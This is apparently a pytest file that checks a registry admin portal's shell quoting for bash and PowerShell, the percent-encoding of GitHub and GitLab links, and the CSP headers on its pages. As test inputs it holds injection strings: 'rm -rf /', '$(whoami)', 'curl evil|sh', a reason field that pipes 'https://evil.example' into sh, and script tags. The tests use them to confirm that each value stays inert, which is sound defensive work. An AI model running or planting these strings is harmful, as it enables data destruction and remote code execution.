"""Hostile-input tests for the admin panel's copy-paste commands and links, plus the CSP / advisory banner on portal pages."""
from __future__ import annotations

import json
import re
import shlex
import shutil
import subprocess

import pytest

from registry.portal import admin, build, common

HOSTILE = [
    "plain", "it's", "'; rm -rf / #", "$(whoami)", "`id`", 'say "hi"', "a\nb; calc", "back\\slash", "!history", "x && curl evil|sh",
    "‘; calc; ’", "‛‚'", "tab\there", "$env:USERPROFILE", "${IFS}", "*.*", "",
]
CLEAN = re.compile(r"[\x00-\x1f\x7f]")


@pytest.mark.parametrize("value", HOSTILE)
def test_bash_quote_is_exactly_one_literal_word(value):
    assert shlex.split("echo " + admin.shell_quote(value, "bash")) == ["echo", CLEAN.sub(" ", value)]


def _ps_unquote(quoted: str) -> str:
    """Reference reader for a PowerShell single-quoted string: every quote char (ASCII or U+2018..U+201B) must be doubled."""
    assert quoted[0] == "'" and quoted[-1] == "'", quoted
    inner, out, i = quoted[1:-1], [], 0
    while i < len(inner):
        c = inner[i]
        if c in admin._PS_QUOTES:
            assert i + 1 < len(inner) and inner[i + 1] == c, f"unescaped quote {c!r} would end the string"
            i += 1
        out.append(c)
        i += 1
    return "".join(out)


@pytest.mark.parametrize("value", HOSTILE)
def test_powershell_quote_cannot_be_closed_by_any_quote_character(value):
    assert _ps_unquote(admin.shell_quote(value, "ps")) == CLEAN.sub(" ", value)


def test_curly_quotes_are_doubled_for_powershell():
    q = admin.shell_quote("a‘b’c‚d‛e'f", "ps")
    assert q == "'a‘‘b’’c‚‚d‛‛e''f'"


@pytest.mark.skipif(not shutil.which("pwsh") and not shutil.which("powershell"), reason="PowerShell not installed")
def test_powershell_really_reads_the_quoted_value_back():
    exe = shutil.which("pwsh") or shutil.which("powershell")
    for value in ("it's", "‘; Write-Output pwned; ‘", "$(Get-Date)", "`n"):
        r = subprocess.run([exe, "-NoProfile", "-NonInteractive", "-Command", f"[Console]::OutputEncoding=[Text.Encoding]::UTF8; Write-Output ({admin.shell_quote(value, 'ps')})"],
                           capture_output=True, text=True, encoding="utf-8")
        assert r.stdout.strip("\r\n") == value, r.stderr


def test_admin_js_quoting_matches_the_python_reference():
    js = admin.ADMIN_JS
    assert "['\\u2018-\\u201b]" in js                                                   # PowerShell curly-quote range is doubled
    assert "s.replace(/'/g, \"'\\\\''\")" in js                                         # bash: close, escaped quote, reopen
    assert 's.replace(/(["\\\\$`])/g' not in js                                         # the old double-quote scheme is gone
    assert "shq(cur.target, sh)" in js and "shq(cfg.ops_workflow, sh)" in js and "shq(cfg.github_repo, sh)" in js


@pytest.mark.skipif(not shutil.which("node"), reason="node not installed")
def test_admin_js_shq_matches_python_when_node_is_available(tmp_path):
    src = admin.ADMIN_JS
    start = src.index("function shq(")
    end = src.index("function yq(")
    script = tmp_path / "shq.js"
    script.write_text(src[start:end] + "\nconsole.log(JSON.stringify(process.argv.slice(3).map(v => shq(v, process.argv[2]))));\n", encoding="utf-8")
    for sh in ("bash", "ps"):
        out = subprocess.run(["node", str(script), sh, *HOSTILE[:-1]], capture_output=True, text=True, encoding="utf-8").stdout
        assert json.loads(out) == [admin.shell_quote(v, sh) for v in HOSTILE[:-1]]


GH = {"platform": "github", "github_repo": "devpatel135/AutoStation", "ops_workflow": "ops-action.yml", "ops_ref": "main",
      "default_branch": "main", "manifest_path": "components/automation-registry/manifest.yaml"}


def test_github_command_keeps_hostile_values_inside_their_own_word():
    ci = {"ACTION": "pause", "TARGET": "auto-a", "REASON": "x'; curl https://evil.example | sh #", "PARAMS": "{}"}
    cmd = admin.build_github_links(GH, ci, "t", "d", "ops/pause-auto-a-1")["gh_command"]
    words = shlex.split(cmd)
    assert words[:8] == ["gh", "workflow", "run", "ops-action.yml", "--repo", "devpatel135/AutoStation", "--ref", "main"]
    assert "reason=x'; curl https://evil.example | sh #" in words and "curl" not in words and "|" not in words
    assert len([w for w in words if w == "-f"]) == 5                                      # action, target, reason, params, branch
    ps = admin.build_github_links(GH, ci, "t", "d", "b", shell="ps")["gh_command"]
    assert "reason='x''; curl https://evil.example | sh #'" in ps


def test_github_links_are_percent_encoded():
    nasty = 'a&body=pwned#frag "q" \n<script>'
    links = admin.build_github_links(GH, {"ACTION": "pause"}, nasty, nasty, "ops/x&y=1")
    for key in ("pull_request", "workflow", "edit"):
        assert "&body=pwned" not in links[key] and "#frag" not in links[key] and "<" not in links[key] and " " not in links[key]
    assert "title=a%26body%3Dpwned%23frag" in links["pull_request"] and "...ops%2Fx%26y%3D1" in links["pull_request"]


def test_gitlab_pipeline_links_encode_keys_and_values():
    cfg = {"gitlab_url": "https://gl.example", "project_path": "g/r", "ops_ref": "main", "default_branch": "main"}
    links = admin.build_links(cfg, {"ACTION": "pause", "BAD KEY&x=1": "v&y=2"}, "t&z=3", "d", "b")
    assert "&var[BAD%20KEY%26x%3D1]=v%26y%3D2" in links["pipeline"] and "[title]=t%26z%3D3" in links["merge_request"]


@pytest.mark.parametrize("key,val", [("ops_ref", "main; rm -rf /"), ("ops_ref", "$(id)"), ("ops_ref", "a b"), ("default_branch", "x/../../y"),
                                     ("default_branch", "\"><script>"), ("ops_ref", "-rf")])
def test_unsafe_refs_fall_back_to_main(key, val):
    assert admin.github_config({**GH, key: val})[key] == "main"
    assert admin.github_config({**GH, "ops_ref": "release/1.x"})["ops_ref"] == "release/1.x"


def test_actions_with_shell_active_names_are_not_offered(manifest):
    manifest["automations"]["bad name; $(x)"] = manifest["automations"]["auto-b"]
    acts = admin.build_actions(manifest)["automations"]
    assert acts["bad name; $(x)"] == []                                                   # fail closed: never print an unquotable command
    assert acts["auto-a"]                                                                 # others unaffected


def test_trigger_command_quotes_the_target_in_the_page_script():
    js = admin.ADMIN_JS
    assert "'python -m registry trigger-add ' + shq(cur.target, sh)" in js
    assert "replace(/[^A-Za-z0-9._-]/g, '-')" in js                                       # branch name cannot carry shell/URL syntax


# ---- CSP + labelling on every portal page -----------------------------------------------------------------------
def test_every_portal_page_has_csp_and_advisory_banner(tmp_path, mpath):
    out = tmp_path / "public"
    build.build_portal(mpath, out)
    pages = list(out.rglob("*.html"))
    assert pages
    for p in pages:
        html = p.read_text(encoding="utf-8")
        assert common.CSP_META in html, p.name
        assert "default-src 'none'" in html and "form-action 'none'" in html and "base-uri 'none'" in html
        assert "Telemetry is submitted by installed clients and is not authenticated; treat numbers as advisory" in html, p.name
        assert "https://" not in re.search(r'Content-Security-Policy" content="([^"]*)"', html).group(1)   # nothing remote is allowed to load
